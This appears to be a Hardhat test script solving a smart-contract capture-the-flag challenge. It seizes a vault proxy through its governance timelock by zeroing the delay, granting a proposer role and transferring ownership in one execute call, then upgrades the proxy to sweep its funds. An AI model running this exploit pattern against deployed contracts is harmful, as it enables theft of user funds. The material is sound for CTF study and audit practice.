import { Contract, Signer } from "ethers";
import { ethers, upgrades} from "hardhat";
import { expect } from "chai";
import { SETUP_agusduha, CHALLENGE_agusduha} from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let deployer: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let kingVault: Contract;
let proxy: Contract;
let instance: Contract;
let tx: any;

before(async () => {
    [attacker, deployer] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    
    setup = (await ethers.getContractAt(`contracts/agusduha/Setup.sol:Setup`, SETUP_agusduha)).connect(attacker);

    kingVault = await ethers.getContractAt(`contracts/agusduha/TheKingIsDeadLongLiveTheKing.sol:KingVault`, CHALLENGE_agusduha);
    proxy = await ethers.getContractAt("contracts/agusduha/TheKingIsDeadLongLiveTheKing.sol:KingVault", "0x1020dFFD73141616fa7A931feE757DC9114B79D9");
    instance = await ethers.getContractAt(`contracts/agusduha/TheKingIsDeadLongLiveTheKing.sol:GovernanceTimelock`, await proxy.owner());
    
    console.log(proxy.address);
    console.log(kingVault.address);
    console.log(instance.address);
    expect(await setup.isSolved()).to.eq(false);
});

it("prints contract address", async function () {
    // const addr = await setup.kingVault()
    // expect(addr).to.eq(CHALLENGE_agusduha);
});


it('Exploit', async function () {

    let PROPOSER_ROLE = await ethers.utils.keccak256(
        await ethers.utils.toUtf8Bytes("PROPOSER_ROLE")
    )

    let instanceAddress = await instance.address;
    let kingVaultAddress = await kingVault.address;
    let proxyAddress = await proxy.address;

    exploit = await (await ethers.getContractFactory("contracts/agusduha/Exploit.sol:Exploit", attacker)).deploy();
    // await exploit.doStuff(attackerAddress, await kingVault.address, await instance.address);
    let exploitAddress = await exploit.address;

    let targets = [instanceAddress, instanceAddress, proxyAddress, exploitAddress];
    let values = [0, 0, 0, 0];
    let salt = await ethers.utils.solidityKeccak256(["string"], ["0x"]);

    let iface1 = new ethers.utils.Interface(["function updateDelay(uint64 newDelay)"]);
    let iface2 = new ethers.utils.Interface(["function grantRole(bytes32 role, address account)"]);
    let iface3 = new ethers.utils.Interface(["function transferOwnership(address newOwner)"]);
    // let iface4 = new ethers.utils.Interface(["function upgradeTo(address newImplementation)"]);
    let iface5 = new ethers.utils.Interface(["function doStuff(address _attacker, address _vault, address payable _thisTimelock)"]);

    let freeVaultFactory = await ethers.getContractFactory("contracts/agusduha/Exploit.sol:NewKing", attacker);
    let freeVault = await freeVaultFactory.deploy();
    let freeVaultAddress = await freeVault.address;

    let data = [
        iface1.encodeFunctionData("updateDelay", [0]),
        iface2.encodeFunctionData("grantRole", [PROPOSER_ROLE, exploitAddress]),
        iface3.encodeFunctionData("transferOwnership", [attackerAddress]),
        //iface4.encodeFunctionData("upgradeTo", [freeVaultAddress]),
        iface5.encodeFunctionData("doStuff", [attackerAddress, proxyAddress, instanceAddress])
    ];
    
    await instance.connect(attacker).execute(targets, values, data, salt);

    expect(await instance.delay()).to.eq(0);
    expect(await proxy.owner()).to.eq(attackerAddress);

    console.log('why');

    // let freeVaultFactory = await ethers.getContractFactory("contracts/agusduha/Exploit.sol:NewKing", attacker);
    // console.log(await ethers.provider.getBalance(await freeVault.address));
    
    //let iface = new ethers.utils.Interface(["function _setKing(address newKing)"]);
    //let data1 = iface.encodeFunctionData("_setKing", [attackerAddress]);
    let iface = new ethers.utils.Interface(["function sweepFundsFree()"]);
    let data1 = iface.encodeFunctionData("sweepFundsFree", []);
    let tx = await proxy.connect(attacker).upgradeToAndCall(freeVaultAddress, data1);
    tx.wait();
    // this.freeVault = await upgrades.upgradeProxy(proxy, freeVaultFactory);
    // await proxy.sweepFundsFree();

    expect(await setup.isSolved()).to.eq(true);
    });